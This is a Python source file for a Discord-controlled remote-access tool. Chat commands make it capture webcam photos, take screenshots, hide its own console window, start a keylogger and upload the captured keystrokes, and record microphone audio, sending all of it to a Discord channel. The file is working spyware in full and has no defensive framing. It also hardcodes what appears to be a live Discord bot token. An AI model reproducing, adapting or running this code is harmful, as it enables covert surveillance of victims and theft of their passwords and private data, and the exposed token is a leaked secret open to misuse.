import discord
import cv2
import os
import psutil
import pyautogui
import ctypes
import time
import sounddevice as sd
import wave
from PIL import ImageGrab
from pynput import keyboard

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

TOKEN = 'MTE0MjQ4MzM5NTQxOTU5MDY3Nw.G1AlSE.fD4K9Uo_m2I0lD-fAmlU7m8emLMrdpkO-kP1Jw'

def capture_image(image_path):
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        return False

    ret, frame = cap.read()

    if ret:
        cv2.imwrite(image_path, frame)
        cap.release()
        return True
    else:
        cap.release()
        return False

def capture_screenshot(image_path):
    screenshot = ImageGrab.grab()
    screenshot.save(image_path)

def hide_console():
    console_window = ctypes.windll.kernel32.GetConsoleWindow()
    if console_window:
        ctypes.windll.user32.ShowWindow(console_window, 0)
        ctypes.windll.kernel32.CloseHandle(console_window)

def start_keylogger():
    def on_key_release(key):
        try:
            with open('keylog.txt', 'a') as f:
                f.write(f"{key.char}")
        except AttributeError:
            if key == keyboard.Key.space:
                with open('keylog.txt', 'a') as f:
                    f.write(" ")
            elif key == keyboard.Key.enter:
                with open('keylog.txt', 'a') as f:
                    f.write("\n")
            elif key == keyboard.Key.backspace:
                with open('keylog.txt', 'r') as f:
                    lines = f.readlines()
                with open('keylog.txt', 'w') as f:
                    f.writelines(lines[:-1])
    
    listener = keyboard.Listener(on_release=on_key_release)
    listener.start()

@client.event
async def on_ready():
    print(f'Logged in as {client.user.name}')

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    content_lower = message.content.lower()

    if content_lower == '/image':
        image_filename = 'capture.png'
        image_path = os.path.join(os.path.dirname(__file__), image_filename)

        if capture_image(image_path):
            await message.channel.send(file=discord.File(image_path))
        else:
            await message.channel.send("Error capturing image from webcam.")

    elif content_lower == '/screenshot':
        screenshot_filename = 'screenshot.png'
        screenshot_path = os.path.join(os.path.dirname(__file__), screenshot_filename)

        capture_screenshot(screenshot_path)
        await message.channel.send(file=discord.File(screenshot_path))

    elif content_lower == '/help':
        help_message = (
            "Available commands:\n"
            "/image - Capture an image from the webcam.\n"
            "/screenshot - Capture a screenshot of the screen.\n"
            "/hideconsole - Hide the console window.\n"
            "/keylogger - Start logging keys.\n"
            "/getkeylog - Get keylog text file.\n"
            "/audio - Record and send an audio clip.\n"
        )
        await message.channel.send(help_message)

    elif content_lower == '/hideconsole':
        hide_console()
        await message.channel.send("Console window hidden.")

    elif content_lower == '/keylogger':
        start_keylogger()
        await message.channel.send("Keylogger started.")

    elif content_lower == '/getkeylog':
        await message.channel.send(file=discord.File('keylog.txt'))

    elif content_lower.startswith('/audio'):
        parts = content_lower.split(' ')
        if len(parts) == 2 and parts[0] == '/audio':
            try:
                clip_length = int(parts[1])
                if clip_length <= 0:
                    await message.channel.send("Invalid clip length.")
                    return

                await message.channel.send(f"Recording audio for {clip_length} seconds...")
                audio_filename = 'audio.wav'
                audio_path = os.path.join(os.path.dirname(__file__), audio_filename)

                audio_data = sd.rec(int(clip_length * 44100), samplerate=44100, channels=2, dtype='int16')
                sd.wait()
                
                with wave.open(audio_path, 'wb') as wf:
                    wf.setnchannels(2)
                    wf.setsampwidth(2)
                    wf.setframerate(44100)
                    wf.writeframes(audio_data.tobytes())

                await message.channel.send(f"Audio recording for {clip_length} seconds complete.", file=discord.File(audio_path))
            except ValueError:
                await message.channel.send("Invalid clip length format.")
        else:
            await message.channel.send("Usage: /audio <length_in_seconds>")

client.run(TOKEN)
